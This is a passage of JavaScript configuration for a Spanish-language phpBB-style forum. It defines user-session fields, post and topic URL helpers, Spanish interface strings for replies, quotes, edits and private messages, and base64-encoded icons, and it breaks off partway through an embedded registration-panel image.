var init = init,
    ops = {
        header: function () {
            console.log('%c|||| %c|||| %c|||| %c|||| %c|||| %c|||| %c|||| %c|||| %c||||', colors.green, colors.green, colors.green, colors.white, colors.gray, colors.white, colors.red, colors.red, colors.red);
            console.log('%c**************************Open Source phpBB********************************', colors.red);
            console.log('%c***************************** 2014 - '+new Date().getFullYear()+' *********************************', colors.blue);
            console.log('%cC %ch %ca %cl %co %c- %cV %ca %cl %cd %ce %cz', colors.gray, colors.red, colors.orange, colors.yellow, colors.green, colors.teal, colors.blue, colors.purple, colors.brown, colors.gray, colors.red, colors.orange);
        },
        nombre_perfil: pu && init.g('strong', init.g('.module', init.g('#profile-advanced-right'))[0])[0].textContent,
        mi_nombre: _userdata.username,
        mi_avatar: _userdata.avatar,
        miavatarSRC: _userdata.avatar.match(/[-a-zA-Z0-9@:%_\+.~#?&\/\/=]{2,256}\.[a-z]{2,4}\b(\/[-a-zA-Z0-9@:%_\+.~#?&\/\/=]*)?/g)[0],
        mi_id: _userdata.user_id,
        tid: _lang.Notif_abuse.match(/(?!tid=)(\w+)(?=">)/)[0],
        soy_staff: _userdata.user_level >= 1,
        soy_adm: _userdata.user_level === 1,
        soy_user: _userdata.user_level === 0,
        estoy_logueado: _userdata.session_logged_in === 1,
        myStaff: ['Chalo', 'RinC', 'Dosh', 'YoshiGM', 'Fibo', 'Andreii'],
        path_edit: tm && document.location.origin + '/post?p=' + init.g('.post')[0].id.match(/(\d+)/g)[0] + '&mode=editpost',
        id_tema: tm && document.location.pathname.match(/\/t(\d+)/)[1],
        id_f_post: tm && init.g('.post')[0].id.match(/(\d+)/g)[0],
        url_reply: tm && '/post?t=' + document.location.pathname.match(/\/t(\d+)/)[1] + '&mode=reply',
        topic_name: function () {
            var a = isTitle,
                c = /(.+)(?=-)/g;
            return a.match(c) ? a.match(c)[0] : a
        },
        audio: init.g('.audioElem')[1],
        p_Fi: tm && init.g('.post'),
        num_sub_section:  tm && init.last(init.g('.nav')).href.match(/f(\d+)/g)[0],
        count: '',
        temp: '',
        post_dom: '.post',
        button_dom: '.post',
        preview_dom: 0,
        editor: 0,
        mode: 0,
        url: 0,
        textarea: 0,
        ajax_load: '<center><i style="color:rgb(0, 0, 0);font-size:32px"class="fa fa-spinner fa-pulse"></i></center>',
        cf_name: tm && init.g('#Name_post').textContent,
        lang: {
            reply: 'Modo: <p style="color:rgba(128, 0, 128, 1);display:inline">Respuesta</p>',
            pm: 'Modo: <p style="color:rgba(0, 0, 139, 1)">Mensaje Privado</p>',
            edit: 'Modo: <p style="color:rgba(255, 0, 0, 1);display:inline">Edición</p>',
            quote: 'Modo: <p style="color:rgba(0, 128, 0, 1)">Citar</p>',
            preview: '<div class="reply-mode">Modo: <p style="color:rgb(173, 216, 230)">Previsualizar</p></div>',
            loading: 'Cargando...',
            success: 'Tu mensaje ha sido publicado con éxito',
            notice_text_a: 'Editor de texto, ¿tienes dudas de su uso?, pregunta...',
            notice_text_b: 'Recuerda que para ver los códigos debes tener mínimo 6 comentarios...',
            notice_reply: ' si deseas publicar tu mensaje presiona ENVIAR',
            notice_quote: 'Estas citando un comentario, si deseas citar a alguien más repite la operación, de lo contrario presiona enviar',
            notice_edit: 'Estas en el modo edición',
            notice_mp: 'Vas a enviar un mensaje privado',
            notice_wall: 'Vas a enviar un mensaje al muro de ',
            flood_message: 'No puedes enviar 2 mensajes consecutivos',
            error_message: 'Ocurrió un error recarga la página',
            no_message: 'No tienes nada en el editor, escribe un mensaje',
            notify_message: _userdata.username + ' deseas mencionar a',
            quote_message: 'en el Post',
            tag_message_title: '[Mensaje automático] fuiste mencionado en: ',
            tag_message_error: 'No se encuentra el nombre',
            tag_message_content: ' fuiste mencionado en ',
            pm_message_title: 'Te enviaron un mensaje en el tema: ',
            pm_message_error: 'No se encuentra el nombre',
            wall_message_title: _userdata.username + ' te escrió desde ',
            preview_button: 'Previsualizar',
            close_button: 'Cerrar',
            send_button: 'Enviar',
            subjectError: ' No puedes enviar aún, el título o el contenido deben contener más de 10 caracteres',
            namePmError: ' selecciona el nombre del destinatario del mensaje',
            imgur_placeholder1: 'Selecciona los archivos que deseas subir',
            imgur_placeholder2: 'URL externa',
            thumbs: '<i class="fa fa-thumbs-up" aria-hidden="true"></i> ',
            watchBTN: '<i class="fa fa-eye"></i> Seguir el tema',
            unwatchBTN: '<i class="fa fa-eye-slash"></i> Dejar de seguir el tema',
            watchBTNs: '<i class="fa fa-eye"></i> Seguir el subforo',
            unwatchBTNs: '<i class="fa fa-eye-slash"></i> Dejar de seguir el subforo',
            loadlike: '<center><i style="color:rgb(255, 255, 255);font-size:14px;"class="fa fa-spinner fa-pulse loadlikeimg"></i></center>',
            cf_p_a: _userdata.username + ' introduce el link de la imagen que será tu portada',
            cf_p_b: _userdata.username + ' introduce el código del color para tus títulos',
            cf_p_c: _userdata.username + ' introduce el código de css para poner sombra',
            red_flag: 'https://allphpbb31.com/flag.png',
            wifioff: '<i class="fa fa-wifi offline" style="color:rgb(255, 0, 0);vertical-align:bottom;text-shadow:0 1px rgb(255, 255, 255);float:right"></i>',
            wifion: '<i class="fa fa-wifi online" style="color:rgb(0, 128, 0);vertical-align:bottom;text-shadow:0 1px rgb(255, 255, 255);"></i>',
            poke_img: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABL1BMVEUAAADm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubm5ubn5+bo5+bj5Obl5ubn5ubY3eW6y+SdueONr+KMr+KVtOKfuuOowOO1yOTD0OTQ2OXb3+XR2eWkveN8pOFqmeBml+BomOBsmuBynuB+peGcuOLL1eXO1+WguuN2oeFnl+BnmOC4yuTk5ebc4Obi5ObT2uV0n+FpmeBwneBunOCIrOLW3OWHq+F8peG9zeSrweNlluBrmuCvxOPL1uXF0eS+zeTBz+Ta3uVzn+G0x+SpwePp6OamvuOIrOHV3OWyxuR/puHS2uVtm+DH0+WpwON5o+G1x+R+puGAp+GzxuTd4ebe4eauxOP///+pNLJ1AAAAFnRSTlMAAA9Nlcjm9fw6tfM+3hS9W/ak0uv75D7E6gAAAAFiS0dEZMLauAkAAAAJcEhZcwAAN10AADddARmARl0AAAFXSURBVDjLhZPnWsIwGIVTVtmbJKUoqEgFUhRHEAVxY1UUceCe938PpmUVntK8/9rztk/G+QAQBIfT5faIXmjCK3rcLqdDEADLff4AtCTg9zFDCIbgXEJBAYQj0IZIGERjdkIsCuLQljhITL9AGEpSGmGMkaw/J0ByKpYzC4vZ3NLySn61oEiyDJNANMVwrVgqEwO1sr6Rq24iEaRYIjMgSm9t71CqDqlRSsguTgGW1/cURdlvVJuT+KB1WCmXjzIIMgEdn5ROS2fn7XGsqhfa5dV154atUxcat4SS7h2Z5Cop9thG9H0YQrOm1vLTwj0artxaoA+PHEHrQXvhCdsL/WdkK7x0xj+YI7xaCW9tOoC038d7MAkf+c/+gK9sx3TB7LKMk6Tf9Z8R0uR7mGLXLf92/zStgOQR5oaIRmGwXiDryiVnKzdLgl9abu25g8MdPe7w8sb/H/I4fJ+8yTaNAAAAJXRFWHRkYXRlOmNyZWF0ZQAyMDE0LTA0LTExVDA4OjEzOjM4KzA4OjAw7hBNOgAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxNC0wNC0xMVQwODoxMzozOCswODowMJ9N9YYAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAAAAElFTkSuQmCC',
            banner_blank: 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAgEBLAEsAAD/7QaCUGhvdG9zaG9wIDMuMAA4QklNA+0KUmVzb2x1dGlvbgAAAAAQASwAAAABAAEBLAAAAAEAAThCSU0EDRhGWCBHbG9iYWwgTGlnaHRpbmcgQW5nbGUAAAAABAAAAB44QklNBBkSRlggR2xvYmFsIEFsdGl0dWRlAAAAAAQAAAAeOEJJTQPzC1ByaW50IEZsYWdzAAAACQAAAAAAAAAAAQA4QklNBAoOQ29weXJpZ2h0IEZsYWcAAAAAAQAAOEJJTScQFEphcGFuZXNlIFByaW50IEZsYWdzAAAAAAoAAQAAAAAAAAACOEJJTQP1F0NvbG9yIEhhbGZ0b25lIFNldHRpbmdzAAAASAAvZmYAAQBsZmYABgAAAAAAAQAvZmYAAQChmZoABgAAAAAAAQAyAAAAAQBaAAAABgAAAAAAAQA1AAAAAQAtAAAABgAAAAAAAThCSU0D+BdDb2xvciBUcmFuc2ZlciBTZXR0aW5ncwAAAHAAAP////////////////////////////8D6AAAAAD/////////////////////////////A+gAAAAA/////////////////////////////wPoAAAAAP////////////////////////////8D6AAAOEJJTQQIBkd1aWRlcwAAAAAQAAAAAQAAAkAAAAJAAAAAADhCSU0EHg1VUkwgb3ZlcnJpZGVzAAAABAAAAAA4QklNBBoGU2xpY2VzAAAAAGkAAAAGAAAAAAAAAAAAAACWAAAA7QAAAAQAQwBDAEIAMgAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAA7QAAAJYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOEJJTQQREUlDQyBVbnRhZ2dlZCBGbGFnAAAAAQEAOEJJTQQUF0xheWVyIElEIEdlbmVyYXRvciBCYXNlAAAABAAAAAE4QklNBAwVTmV3IFdpbmRvd3MgVGh1bWJuYWlsAAAC5QAAAAEAAABwAAAARwAAAVAAAF0wAAACyQAYAAH/2P/gABBKRklGAAECAQBIAEgAAP/uAA5BZG9iZQBkgAAAAAH/2wCEAAwICAgJCAwJCQwRCwoLERUPDAwPFRgTExUTExgRDAwMDAwMEQwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwBDQsLDQ4NEA4OEBQODg4UFA4ODg4UEQwMDAwMEREMDAwMDAwRDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDP/AABEIAEcAcAMBIgACEQEDEQH/3QAEAAf/xAE/AAABBQEBAQEBAQAAAAAAAAADAAECBAUGBwgJCgsBAAEFAQEBAQEBAAAAAAAAAAEAAgMEBQYHCAkKCxAAAQQBAwIEAgUHBggFAwwzAQACEQMEIRIxBUFRYRMicYEyBhSRobFCIyQVUsFiMzRygtFDByWSU/Dh8WNzNRaisoMmRJNUZEXCo3Q2F9JV4mXys4TD03Xj80YnlKSFtJXE1OT0pbXF1eX1VmZ2hpamtsbW5vY3R1dnd4eXp7fH1+f3EQACAgECBAQDBAUGBwcGBTUBAAIRAyExEgRBUWFxIhMFMoGRFKGxQiPBUtHwMyRi4XKCkkNTFWNzNPElBhaisoMHJjXC0kSTVKMXZEVVNnRl4vKzhMPTdePzRpSkhbSVxNTk9KW1xdXl9VZmdoaWprbG1ub2JzdHV2d3h5ent8f/2gAMAwEAAhEDEQA/APVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0PVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0fVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0vVUkkklKSSSSUpJJJJSkkkklKSSSSUpJJJJSkkkklP/0/VUl8qpJKfqpJfKqSSn6qSXyqkkp+qkl8qpJKfqpJfKqSSn6qSXyqkkp+qkl8qpJKf/2QA4QklNBCEaVmVyc2lvbiBjb21wYXRpYmlsaXR5IGluZm8AAAAAVQAAAAEBAAAADwBBAGQAbwBiAGUAIABQAGgAbwB0AG8AcwBoAG8AcAAAABMAQQBkAG8AYgBlACAAUABoAG8AdABvAHMAaABvAHAAIAA2AC4AMAAAAAEAOEJJTQQGDEpQRUcgUXVhbGl0eQAAAAAHAAgBAQABAQD/7gAhQWRvYmUAZEAAAAABAwAQAwIDBgAAAAAAAAAAAAAAAP/bAIQAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQICAgICAgICAgICAwMDAwMDAwMDAwEBAQEBAQEBAQEBAgIBAgIDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD/8IAEQgAlgDtAwERAAIRAQMRAf/EAF0AAQEAAAAAAAAAAAAAAAAAAAAKAQEAAAAAAAAAAAAAAAAAAAAAEAEAAAAAAAAAAAAAAAAAAACQEQEAAAAAAAAAAAAAAAAAAACQEgEAAAAAAAAAAAAAAAAAAACQ/9oADAMBAQIRAxEAAAC/gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH//2gAIAQIAAQUADr//2gAIAQMAAQUADr//2gAIAQEAAQUADr//2gAIAQICBj8ADr//2gAIAQMCBj8ADr//2gAIAQEBBj8ADr//2Q==',
            l_iM: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACWklEQVRYR+WXO2iVQRCFzxkfsbO0sVDUyiqdiMZOBAsLSVCMIjZWPkgi2vhItEoiCSLYKZqAUQQRKxFEImKlrQgSsbO1MxjnyMgm3NzX/v+9l5vCrS7/7sz5dmZ2dy6xxoNrrI9WALaa2VlJhwBsA7ARwALJV+5+D8D3MpsqCzBM8haATQ1EFiVdAzBeFKIwgJlNShqucvwbgAPoqfxOcsrdh4pAFAXoJ/m0wuELSRGJj+lbL8nY+ZHlNZL6ATzLQRQBMJJfAWwPZ812Z2ZTki4m0QVJu1KEGnIUAdhH8l3y8EXSbgB/GnhcT/IzgJ0xL6kPwLJtXZMiACMkJ5LDGwBGm4XVzEZTIQbAJQCTzdZnAcxsQtJIAjgJYDaT11MkH6Z0jbv75XYBpiVdSADHAcxlAAZJziSA2+7+D77RKBKB/xNgM4Co4B6SpwEcTiGddvf3mSLcL+l8WvNS0iMAiwDmAfystq2Xgh0kQ2RL7hIpOf9D0l4A3yrtagDMbCXnJQWyy0nWFGU9gFlJJ7LeWlgQx9PdI6Uro12AT3E7A+gtwtNJAEk6CuB5Eh4g+SQH0UmAeUkHVoWS/ABgT9NLp4MpeC3pYBXAWwCroGqOXAcBltJLF7uO0UfyDYB13YpA9AVz7h5vQ/yOxiNqounoZA3EU3sdwFgomtmYpKvdBqhsuY6RfNxVAJI33f1+ikC06Ve6CpATqzdftAZmJA22IpCzIfnA3c80vYoBDMWjkXPWyrykcwDu5gA2mNkdSQPVfzhaEU02v9KxjZZ9KQfQhk5502xPWN5lOYu/hAM9MFOo7kYAAAAASUVORK5CYII=',
            dom_phpbb3: '<span style="color:rgba(0, 93, 144, 1)">php</span><span style="color:rgba(242, 136, 24, 1)">BB3</span>',
            dom_punbb: '<span style="color:rgba(102, 116, 128, 1)">pun</span><span style="color:rgb(34, 95, 135)">BB</span>',
            dom_invision: '<span style="color:rgb(63, 76, 107);">Invision</span>',
            dom_phpbb2: '<span style="color:rgb(11, 143, 212)">php</span><span style="color:rgb(0, 106, 159)">BB2</span>',
            dom_chrome: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAjZJREFUOI2NUE1I1HEQfW92NRW/opI6SBmp0EHSVZcg0LC2NSP6OIYZhBdjET0IlbEJEUjnCkMw8VhJoaZ9qqFZIQZRewtC6VCdtrbIjf9Mh3bX/aDonWbm996b3zwiDV+8Xo8DdAjZqGQpVCnksgFPSF4vWVh4ncxnvPjU0JDPaPQqgJPppnEoYARuhIuKOiumplYTBh89nrys7OynALx/E6fh8aZwuIWhUFQAIDcnZyOAqv8UA8C+z4WFlwGA/lF/g5jm3rzytR5kHwCY2TTI3pJweJGhUPRfTm4ApwF4ZmrWeRuXVttAvu+r6T52u7yiX8D7m6Gi4MjZbdPnA9sfPRSwLi42wzWhYQ8oO4eactpAdjoiXTFxB4AiQAoE7Oj/sPeSqHUlbzfqfqGhNNb1tfeUzG2Zn38n4ImMvypbuWvyuapF1mbYKvGagg2/dPVC7EUyDARGwgCzlLERK4mOCPju+XYoOJJhYBjWN821IlKwxueym8QMgLLYKMvtcGB9dPFIOLvWoGyFwGAYznfl9pjJXSZ5Ephmy6iv3iAvU+/VWSG7x48/WAoGgwIAwaOvDoIylsKj1hEAmu/4h0icyshN9ZuIvJioKDjkOJG3AilPXKQYdFVPtAsAuLLcZ6A6l5mb5JvDc+Z870wWq+KZFEcCfzgAxg+P/8hzCn0ABqFIpGzE8ESle0XB3pTNxZEDLJv9GcshFf5b/moRa1fDblFX81glL5pZE40zdOmAVE0uJvN/A6NizyHrhCt8AAAAAElFTkSuQmCC" style="width: 12px;">',
            dom_firefox: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADVklEQVR4XmWPS2icZRSGn+/75/LPrdNOJpFkJs1trCUx2FZNsRspWtCgkQa7qFFRFCtG3UhFRWIVURHd2IUirQuxICGKiaWXGArVGjE1JSptYpq0uTmZpJlkJpnLP7fvcxZdiD7wbg7n5TxHJJ4O4+/sQrx2HTPgw/D6HlOm50NcnpDhcqOVwCtT7G++8kM+Z//o+MHzg6VJNwrAkkgtBQhjHiWxCmI+XbKdaG0Ihrp2V1NR34xZU0vcqIYl577jTw2dRZBFsI+bSI3ht870hc+0W6U3H6wJf9XuYrhD0ztrI+10kBF2bG4Hg9EI7326E5Il09hSGJSSywgQC4837PI69ajD58MoF+zWBv1jLrr3f4GtqgKb0NgyGZJTUyyNjlBnzTPRfRGHx0AJ0S433csz5m4XRpOT7HqCdMaicmOBl/oPEpw4haGhlEkhUnHCt+8gHt5H7Mc8siBITtoesa2syxcCoRKmzqNLoBG0dZYX7z9MdixI4rcLpKfLtvksvspGpNpMfWcJyGLeCB6S66cFXremMJ6lWNDE18A+O8b0iV5WF1bx+CqwFfJQtkhcHWPb8gWG/6oHp8CozWEL1kFhRlOMaiamBRU+aPH2MKWrcaskWgLKQK2vYaWydGxbYk8+g7YcyNoi0sqAWAMhAUMg7YJfPZ/Qo77nknqXpZ3fcqDFJLe2ChtpnNsbIFCkGLNT9BdicuQXNam8IN2wtUYj7JK+kxZ7r5zDmFnhraMXGez9DrW6yhOhLO2eGVSuElVULP4hzsu4O38sugzKAxUBqNoi2LvH5GecNI7U885iK/OLiucb0ny5I0ZztQPuvgedExz6OHoEIDDU2rR09dWIHn+ySUe7IjrV3aiLh2/VyVdu0z89d5eee6NF6547tf6mnNlHdX7ggL70YsvngBQD4QjHEisPPOsPnq5pAafpBq3wh+1U7VIUrSLWdYljK5gRic10kRgqrAQ+GL0j9XZbVEoDBlKJc58lb3TM/amX537PkFpTRC/nuNaXI9afY2MuRzZWJDdpMHMqN1gu35c60hYFECfrIgA8NDvlALa/Hwo93HaL9+VNfqPKtdmGyyjh9BkU/MbI1+Pxo6+fnRsuX77GTQT/JwCEAft/5uvA30CGf/EPKB5zlAmqZukAAAAASUVORK5CYII=" style="width: 12px;">',
            dom_safari: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACOklEQVQ4T6WTT0gTUBzHP08my00N1jZ1JhMXdKihMbMyPEQX7WJQS7IdDC0YXTtWdBE6dRQj8hAs/1BQXdZJImulNfojEmWKf8ot9yecupn/Xjzbpmu79eCdfu/7ed/fP8F/HrFTL6XMA1qA88BRwASEgDdAL9AvhNjcqUkDpJRVwADgGAslGJmL82tlA8MuDYctBRwwFSidHzgnhJhMQbYASfHr2diaufNlkI/BRFZiNWUFXG8oxVKYPw8cS0FE0vbwbGyttuPJNAsrGzmrkic32a3L516zFUtR/jvgiEpHAVoBT/vjaT4F4znFJUshjIkoY6b92Et19Jy2qncXhBAPFMD7IRBvbH80lVN8MPyF5skXdNZdSsd7zlRSXaZ7JoRoUoDQnZGQsdunUss8TdNDuD8/xXXiBjFtUTrorjdzuc4UEEJYFEB2Ds4x8D6aoW6wFdM26aU7WMzbEntGzFlj4NpJy6oQQrvloMs3b+wa2nawR6/B47JxazDA8/FYlrMrDWbc9ea0A69/drnRdf9va1Vfb57ai8cf4evP7HaqN71tNmrKt2vQKiUeZ883Rn/EsZfrmFtYJbK0nrOohyr09F20ZXRBje/wVPR37dm74ywmNtiUuRfEoNfQ37GPSoN2ew6Sk6iQvonwivnqwxlGv2fPQ3WFjttOK1aDVhWrXggxkUp56zsppYL0S4nDP7PMq4lFwsvrmAo1HK8qwmHVp3ahJSXOACQhO7fRARiBCKAs96n77zb+AZCI5hEGVdRyAAAAAElFTkSuQmCC" style="margin-top:-1px;width:13px">',
            dom_explorer: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADNUlEQVQ4T5WTe0hTcRTHz++6u7lclrqhYpZmNlPDV1q6RdIWWVoQ1R/VPz2tKIKKoAyiPyyiJCp6E73DyoLoYS8LihJSYzNLZ+qcm21Tpmtr97q7+zhh0YuC6vx5Dt/POXw5XwL/UdhemCAiXygxEEc40kIXNT4j/6IPdpWlUl5vJcGQDEW4SzHoxiFYiQSr/gyYsy0lO0mzsih9rD4r0hRfHN2ZWHFP8fBmp2oT1J22Dy8NXcnNo2gq4TeAasHOdVsXzjiwUJ+uSgw+haZXj+CkuwTaej+C68MHX8A/uJmvO3WOv5Q7XaZAyy8AunRrefn8mScNaYTo5a/QYjaZF9dPfeBnWF24Jmm6QqEkoX6ryHpca4YenzhPCOAPQPESdWyctn2LUYouzwyAtc3aXO2ZoKvaVsVA8W6ZJlFeG5ZcMEsc6AXW/tbHsB+18ORM33dAeEHZ0k3zVJc3G9Wk3+aHRZ51VaJcXjk+Kgq8Xi9kkMHl93vhEIYE4GzNIPndO5jaw/u+A6pP6I4nj0tcny4iLPJsAH9sGpczRsmlRlLAhiRweDi6ztyndNtdgO73EM44awdrKku/APiW/CKzTX50nGpSzoU2NRxRrYfJaaNC2XHhbHoEBTZWgpfdLLR2enHA6kDRacEoxmF2XttjJGjRjRQItz0oZhYH3/QU5TYuBz5LD+NTol4MeMS52hiALh4xgeUymq0eo7fbKkmuDnE047J4bh++TfiuPD0AMcBA6oajd3zqCquBUNn5EJOVwkMYWaUM+G/RERHJ8qBwo6OlN1V0OWH4giRZYHX71QNnCd+dXwJhsVOgg9u1t167//g7TYUvdiKRZWhBGR+JtIL2S4FgBGPrkwl2FxDmE6q5/vv2IdN8qKkRSagnN4/IppVBS0MpXdJUULbr7IpWHx50SvRojI4GeoQSkGEB/CxCiJdGEu5iAi9sfH16LTvsH0FbXjwPulLSVb+YNjTNHm4a910fq+Fdexo+qdN8PBXDC2KAE4QGoOiLwWPLnv+cH4KOQiWQjBje0VpPcdJDHJLakMMgsvBMsbTx3d/CRhDh6y+YctQCS2XKOMlKDKaevwm/zT8Dn9uLUCHmff0AAAAASUVORK5CYII=" style="margin-top:-1px;width:13px">',
            dom_opera: '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJ0lEQVQ4T21TPWhUQRD+ZjdgOpt7dwFFTSFWlne3+05RFKNX+NOkCZIIKRKwiD8giEH8AVHBwhQxiIgSxMpCq4hgzuJ2z8PCxiqQCF6Ru3dNOovcjrwz77nvcLvvm5lvPmZmCQOvUy4fYSln4dxRZt4Th4UQv8C8SlIuBvX6N7+EErBWre7avbW1BOZLMecAJ4gMej0JIXSS55gXCsPD16lW2465vgADolsuv2MhLnjq1by1KzGOtJ5g4E0SI2A5Z+0UAdwXaCs1S0TP0i7AlxFrj/tWO0o1QVRMOCaaLBizTDw+Ljut1k8C9qYdmO8EjcbdjIDWDwDc9Lj1wNqD1NW65ICvA4OZCKx9O+BgCkSvMnlCFCnSeoaBJT/AwJmCtR99LlLqLBN9yAgQzVAnDOfBfH9A+URQr6/6XDsMx4g5I0rA7f8KCKKTOWM+ZwS0Pk1AfyvpY75Fba0nCXidccB8Pmg0MnYjpc4x0fuBvIu0WSqNCinXM8rAdN7alwNbmAbwwueGpNzfv4NNrWsCOOYFH+at9VeGdhg+IeZraQ7Rp7wxY38FKhUF5+oCEDEm4EfO2sPxpcU4vpWo1VoDMBpj59y2kLKYN+Z7+hfaSt0gokeeiyuBtQsx7mo9z8A97wovF4xZ3Gn2ryRS6mqP+bEQYmiH3WBmSUT7+ti53yTlXGDM86QqdZAQUaVyCMxzzHzKOXeAhHBwboOEWHG93tORZnPDH+QfP1HZVOXXqN8AAAAASUVORK5CYII=" style="margin-top:0;width:11px"/>',
        },
        html: {
            regpanel: '<div id="qick_reg" style="z-index:999999;display:none"> <div id="reg_loder">Enviando y verificando información ...</div> <h1 style="font-size: 28px;text-align: center;font-family: monda;"><img style="width: 50px;vertical-align: middle;"src="data:image/png;base64,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